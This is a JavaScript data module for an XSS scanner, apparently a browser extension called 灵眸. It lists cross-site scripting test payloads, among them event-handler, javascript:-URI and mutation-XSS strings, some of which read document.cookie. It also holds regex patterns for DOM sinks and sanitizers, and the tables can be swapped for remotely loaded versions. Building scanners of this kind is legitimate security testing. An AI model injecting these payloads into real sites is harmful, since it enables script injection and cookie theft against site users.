// 灵眸 - XSS Scanner Data Tables
'use strict';

import { loadRemotePayloads } from './vk-payload-remote.js';

const XSS_SCAN_PAYLOADS = [
  { name: 'alert(1)', value: '<script>alert(1)</script>' },
  { name: 'img onerror', value: '<img src=x onerror=alert(1)>' },
  { name: 'svg onload', value: '<svg onload=alert(1)>' },
  { name: 'body onload', value: '<body onload=alert(1)>' },
  { name: 'svg script', value: '<svg><script>alert(1)</script></svg>' },
  { name: 'details ontoggle', value: '<details open ontoggle=alert(1)>' },
  { name: 'img src onerror', value: '<img src=1 onerror=alert(1)>' },
  { name: 'input onfocus', value: '<input onfocus=alert(1) autofocus>' },
  { name: 'marquee onstart', value: '<marquee onstart=alert(1)>' },
  { name: 'select onchange', value: '<select onchange=alert(1)><option>1</option></select>' },
  { name: 'textarea onfocus', value: '<textarea onfocus=alert(1) autofocus>' },
  {
    name: 'keyframe anim',
    value:
      '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)">',
  },
  {
    name: 'math xss',
    value:
      '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>',
  },
  { name: 'object data', value: '<object data="javascript:alert(1)">' },
  { name: 'embed src', value: '<embed src="javascript:alert(1)">' },
  { name: 'a href js', value: '<a href="javascript:alert(1)">click</a>' },
  { name: 'window.location', value: "<script>window.location='javascript:alert(1)'</script>" },
  { name: 'eval payload', value: "<script>eval('alert(1)')</script>" },
  { name: 'fromCharCode', value: '<script>alert(String.fromCharCode(88,83,83))</script>' },
  { name: 'constructor', value: "''.constructor.constructor('alert(1)')()" },
];

const CONTEXT_PAYLOADS = {
  innerHTML: [
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>',
    '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)">',
  ],
  outerHTML: [
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
  ],
  documentWrite: [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
  ],
  eval: [
    'alert(1)',
    'prompt(1)',
    'confirm(1)',
    'document.cookie',
    "''.constructor.constructor('alert(1)')()",
  ],
  location: [
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  ],
  setTimeout: ['alert(1)', 'document.cookie', "eval('alert(1)')"],
  srcdoc: ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'],
  attribute: ['" onerror=alert(1) ', '" onfocus=alert(1) autofocus="', '" onmouseover=alert(1) "'],
  url: ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>'],
  insertAdjacentHTML: [
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
  ],
  createContextualFragment: [
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
  ],
  scriptSrc: ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>'],
  iframeWrite: [
    '<script>alert(parent.document.cookie)</script>',
    '<img src=x onerror=alert(parent.document.cookie)>',
  ],
};

const SINK_PATTERNS = [
  { context: 'innerHTML', regex: /\.innerHTML\s*=|\.innerHTML\s*\+/g, severity: 'high' },
  { context: 'outerHTML', regex: /\.outerHTML\s*=|\.outerHTML\s*\+/g, severity: 'high' },
  { context: 'documentWrite', regex: /document\.write\(|document\.writeln\(/g, severity: 'high' },
  { context: 'eval', regex: /\beval\s*\(|\bnew\s+Function\s*\(/g, severity: 'critical' },
  { context: 'setTimeout', regex: /setTimeout\s*\(\s*['"`]/g, severity: 'high' },
  { context: 'setInterval', regex: /setInterval\s*\(\s*['"`]/g, severity: 'high' },
  {
    context: 'location',
    regex: /(?:window\.)?location\s*[\.\[]|location\s*=\s*['"`]/g,
    severity: 'high',
  },
  { context: 'srcdoc', regex: /srcdoc\s*=\s*/g, severity: 'high' },
  {
    context: 'attribute',
    regex: /setAttribute\s*\(\s*['"`](?:on[a-z]+|href|src|action|style)['"`]/gi,
    severity: 'medium',
  },
  {
    context: 'url',
    regex: /(?:href|src|action)\s*=\s*(?:location|window\.location|document\.URL)/gi,
    severity: 'medium',
  },
  { context: 'eval', regex: /\bexecScript\s*\(/g, severity: 'critical' },
  { context: 'eval', regex: /\bFunction\s*\(\s*['"`]/g, severity: 'critical' },
  {
    context: 'innerHTML',
    regex:
      /(?:insertAdjacentHTML|\.append|\.before|\.after|\.insertBefore|\.replaceChildren)\s*\(/g,
    severity: 'medium',
  },
  {
    context: 'insertAdjacentHTML',
    regex: /insertAdjacentHTML\s*\(\s*['"`]/g,
    severity: 'high',
  },
  {
    context: 'createContextualFragment',
    regex: /createContextualFragment\s*\(/g,
    severity: 'high',
  },
  {
    context: 'scriptSrc',
    regex: /\.src\s*=\s*(?:location|document\.URL|window\.location|[^"'\s]*\+[^"'\s]*)/g,
    severity: 'critical',
  },
  {
    context: 'iframeWrite',
    regex: /(?:contentDocument|contentWindow\.document)\.write\s*\(/g,
    severity: 'critical',
  },
  {
    context: 'eval',
    regex: /(?:chrome\.runtime\.sendMessage|browser\.runtime\.sendMessage)\s*\(\s*\[\s*['"`]/g,
    severity: 'medium',
  },
  {
    context: 'location',
    regex: /(?:window\.)?open\s*\(\s*(?:location|document\.URL|window\.location)/g,
    severity: 'high',
  },
  {
    context: 'eval',
    regex: /import\s*\(\s*(?:location|document\.URL|\+)/g,
    severity: 'high',
  },
];

const SANITIZER_PATTERNS = [
  { name: 'DOMPurify', regex: /DOMPurify\.sanitize/i, reduction: 5 },
  { name: 'Trusted Types', regex: /createPolicy|trustedTypes/i, reduction: 6 },
  { name: 'escapeHtml', regex: /escapeHtml|escapeXML|htmlEncode|sanitizeHtml/i, reduction: 3 },
  { name: 'textContent', regex: /\.textContent\s*=/, reduction: 4 },
  { name: 'innerText', regex: /\.innerText\s*=/, reduction: 3 },
  { name: 'encodeURIComponent', regex: /encodeURIComponent/i, reduction: 2 },
  { name: 'TextEncoder', regex: /new\s+TextEncoder/i, reduction: 2 },
  { name: 'JSON.stringify', regex: /JSON\.stringify/i, reduction: 1 },
  { name: 'parseInt/parseFloat', regex: /\b(?:parseInt|parseFloat)\s*\(/, reduction: 4 },
  { name: 'Number()', regex: /Number\s*\([^)]*\)/, reduction: 4 },
  { name: 'typeof check', regex: /typeof\s+\w+\s*===?\s*['"`](?:string|number)/, reduction: 3 },
  { name: 'CSP nonce', regex: /nonce[=:_-]/i, reduction: 3 },
  { name: 'Angular sanitization', regex: /\$sce|DomSanitizer|sanitize\.html/i, reduction: 5 },
  { name: 'Vue v-html', regex: /v-html/i, reduction: -2 },
  { name: 'Sanitizer API', regex: /new\s+Sanitizer\b/i, reduction: 4 },
  { name: 'URL validation', regex: /(?:new\s+URL|isURL|isValidUrl)\s*\(/, reduction: 2 },
  {
    name: 'innerHTML forbidden',
    regex: /trusted-types\s+[^\s;]*\s+[^;]*innerHTML/i,
    reduction: 5,
  },
];

const SEVERITY_CONFIG = {
  critical: { label: '严重', color: '#e74c3c', bg: '#fdecea', darkBg: 'rgba(231,76,60,0.15)' },
  high: { label: '高危', color: '#e67e22', bg: '#fef9e7', darkBg: 'rgba(230,126,34,0.15)' },
  medium: { label: '中危', color: '#f39c12', bg: '#fef9e7', darkBg: 'rgba(243,156,18,0.15)' },
  low: { label: '低危', color: '#27ae60', bg: '#e8f8f0', darkBg: 'rgba(39,174,96,0.15)' },
  info: { label: '信息', color: '#4A90E2', bg: '#eaf2fb', darkBg: 'rgba(74,144,226,0.15)' },
};

let _remoteScanPayloads = null;
let _remoteContextPayloads = null;
let _remoteSinkPatterns = null;
let _remoteSanitizerPatterns = null;

loadRemotePayloads(function (data) {
  if (!data || !data.payloads) return;
  if (data.payloads.xss_scan) _remoteScanPayloads = data.payloads.xss_scan;
  if (data.payloads.context_payloads) _remoteContextPayloads = data.payloads.context_payloads;
  if (data.payloads.sink_patterns) _remoteSinkPatterns = data.payloads.sink_patterns;
  if (data.payloads.sanitizer_patterns) _remoteSanitizerPatterns = data.payloads.sanitizer_patterns;
});

function getEffectiveScanPayloads() {
  return _remoteScanPayloads || XSS_SCAN_PAYLOADS;
}

function getEffectiveContextPayloads() {
  return _remoteContextPayloads || CONTEXT_PAYLOADS;
}

function getEffectiveSinkPatterns() {
  return _remoteSinkPatterns || SINK_PATTERNS;
}

function getEffectiveSanitizerPatterns() {
  return _remoteSanitizerPatterns || SANITIZER_PATTERNS;
}

export {
  XSS_SCAN_PAYLOADS,
  CONTEXT_PAYLOADS,
  SINK_PATTERNS,
  SANITIZER_PATTERNS,
  SEVERITY_CONFIG,
  getEffectiveScanPayloads,
  getEffectiveContextPayloads,
  getEffectiveSinkPatterns,
  getEffectiveSanitizerPatterns,
};
